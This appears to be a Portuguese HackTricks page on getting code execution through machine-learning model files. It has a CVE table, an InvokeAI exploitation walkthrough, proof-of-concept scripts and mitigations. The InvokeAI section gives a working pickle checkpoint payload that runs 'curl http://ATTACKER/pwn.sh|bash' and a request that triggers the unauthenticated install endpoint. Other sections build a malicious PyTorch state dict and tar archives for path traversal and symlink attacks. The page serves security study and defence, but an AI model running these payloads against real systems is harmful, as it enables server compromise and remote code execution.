# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Carregando modelos para RCE

Modelos de Machine Learning são geralmente compartilhados em diferentes formatos, como ONNX, TensorFlow, PyTorch, etc. Esses modelos podem ser carregados nas máquinas dos desenvolvedores ou em sistemas de produção para serem utilizados. Normalmente, os modelos não devem conter código malicioso, mas há alguns casos em que o modelo pode ser usado para executar código arbitrário no sistema como uma funcionalidade pretendida ou devido a uma vulnerabilidade na biblioteca de carregamento do modelo.

No momento da escrita, estes são alguns exemplos desse tipo de vulnerabilidades:

| **Framework / Ferramenta**  | **Vulnerabilidade (CVE se disponível)**                                                                                     | **Vetor RCE**                                                                                                                         | **Referências**                               |
|------------------------------|------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Desserialização insegura em* `torch.load` **(CVE-2025-32434)**                                                            | Pickle malicioso no ponto de verificação do modelo leva à execução de código (contornando a proteção `weights_only`)                    | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                        | SSRF + download de modelo malicioso causa execução de código; RCE de desserialização Java na API de gerenciamento                       | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML inseguro) <br> **CVE-2024-3660** (Keras Lambda)                                                   | Carregar modelo de YAML usa `yaml.unsafe_load` (execução de código) <br> Carregar modelo com camada **Lambda** executa código Python arbitrário | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (análise TFLite)                                                                                         | Modelo `.tflite` malformado aciona estouro de inteiro → corrupção de heap (potencial RCE)                                             | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                          | Carregar um modelo via `joblib.load` executa pickle com o payload `__reduce__` do atacante                                             | |
| **NumPy** (Python)          | **CVE-2019-6446** (inseguro `np.load`) *disputado*                                                                          | `numpy.load` padrão permitia arrays de objetos pickle – `.npy/.npz` malicioso aciona execução de código                                 | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (traversal de diretório) <br> **CVE-2024-5187** (traversal tar)                                         | O caminho de pesos externos do modelo ONNX pode escapar do diretório (ler arquivos arbitrários) <br> Modelo ONNX malicioso tar pode sobrescrever arquivos arbitrários (levando a RCE) | |
| ONNX Runtime (risco de design) | *(Sem CVE)* operações personalizadas ONNX / fluxo de controle                                                              | Modelo com operador personalizado requer carregamento do código nativo do atacante; gráficos de modelo complexos abusam da lógica para executar cálculos não intencionais | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (traversal de caminho)                                                                                   | Usar a API de carregamento de modelo com `--model-control` habilitado permite traversal de caminho relativo para escrever arquivos (por exemplo, sobrescrever `.bashrc` para RCE) | |
| **GGML (formato GGUF)**     | **CVE-2024-25664 … 25668** (múltiplos estouros de heap)                                                                     | Arquivo de modelo GGUF malformado causa estouros de buffer de heap no parser, permitindo execução de código arbitrário no sistema da vítima | |
| **Keras (formatos antigos)** | *(Sem nova CVE)* Modelo Keras H5 legado                                                                                     | Modelo HDF5 malicioso (`.h5`) com código de camada Lambda ainda executa ao carregar (modo seguro do Keras não cobre formato antigo – “ataque de downgrade”) | |
| **Outros** (geral)          | *Falha de design* – Serialização Pickle                                                                                     | Muitas ferramentas de ML (por exemplo, formatos de modelo baseados em pickle, `pickle.load` do Python) executarão código arbitrário embutido em arquivos de modelo, a menos que mitigado | |

Além disso, existem alguns modelos baseados em pickle do Python, como os usados pelo [PyTorch](https://github.com/pytorch/pytorch/security), que podem ser usados para executar código arbitrário no sistema se não forem carregados com `weights_only=True`. Portanto, qualquer modelo baseado em pickle pode ser especialmente suscetível a esse tipo de ataque, mesmo que não esteja listado na tabela acima.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` é uma interface web de código aberto popular para Stable-Diffusion. As versões **5.3.1 – 5.4.2** expõem o endpoint REST `/api/v2/models/install` que permite aos usuários baixar e carregar modelos de URLs arbitrárias.

Internamente, o endpoint eventualmente chama:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Quando o arquivo fornecido é um **PyTorch checkpoint (`*.ckpt`)**, `torch.load` realiza uma **desserialização pickle**. Como o conteúdo vem diretamente da URL controlada pelo usuário, um atacante pode incorporar um objeto malicioso com um método `__reduce__` personalizado dentro do checkpoint; o método é executado **durante a desserialização**, levando à **execução remota de código (RCE)** no servidor InvokeAI.

A vulnerabilidade foi atribuída como **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Passo a passo da exploração

1. Crie um checkpoint malicioso:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hospede `payload.ckpt` em um servidor HTTP que você controla (por exemplo, `http://ATTACKER/payload.ckpt`).
3. Acione o endpoint vulnerável (sem autenticação necessária):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Quando o InvokeAI baixa o arquivo, ele chama `torch.load()` → o gadget `os.system` é executado e o atacante ganha execução de código no contexto do processo InvokeAI.

Exploit pronto: **Módulo Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatiza todo o fluxo.

#### Condições

•  InvokeAI 5.3.1-5.4.2 (flag de scan padrão **false**)
•  `/api/v2/models/install` acessível pelo atacante
•  O processo tem permissões para executar comandos de shell

#### Mitigações

* Atualize para **InvokeAI ≥ 5.4.3** – o patch define `scan=True` por padrão e realiza a verificação de malware antes da desserialização.
* Ao carregar checkpoints programaticamente, use `torch.load(file, weights_only=True)` ou o novo [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.
* Imponha listas de permissão / assinaturas para fontes de modelos e execute o serviço com o menor privilégio.

> ⚠️ Lembre-se de que **qualquer** formato baseado em pickle do Python (incluindo muitos arquivos `.pt`, `.pkl`, `.ckpt`, `.pth`) é inerentemente inseguro para desserializar de fontes não confiáveis.

---

Exemplo de uma mitigação ad-hoc se você precisar manter versões mais antigas do InvokeAI em execução atrás de um proxy reverso:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## Exemplo – criando um modelo PyTorch malicioso

- Crie o modelo:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Carregue o modelo:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Modelos para Traversal de Caminho

Como comentado em [**este post de blog**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), a maioria dos formatos de modelos usados por diferentes frameworks de IA é baseada em arquivos compactados, geralmente `.zip`. Portanto, pode ser possível abusar desses formatos para realizar ataques de traversal de caminho, permitindo ler arquivos arbitrários do sistema onde o modelo é carregado.

Por exemplo, com o seguinte código você pode criar um modelo que criará um arquivo no diretório `/tmp` quando carregado:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ou, com o seguinte código, você pode criar um modelo que criará um symlink para o diretório `/tmp` quando carregado:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
## Referências

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
